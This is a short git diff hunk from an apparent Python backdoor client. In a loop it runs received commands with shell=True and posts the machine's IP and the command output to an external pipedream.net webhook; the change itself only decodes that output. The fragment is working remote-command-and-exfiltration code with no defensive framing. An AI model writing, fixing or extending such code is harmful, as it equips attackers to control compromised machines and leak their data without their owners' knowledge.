@@ -52,7 +52,7 @@ while True:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to connect to server")
                         continue
 
-                cmdout = system(command, shell=True)
+                cmdout = system(command, shell=True).decode()
                 if cmdout != "":
                     try:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: {cmdout}")
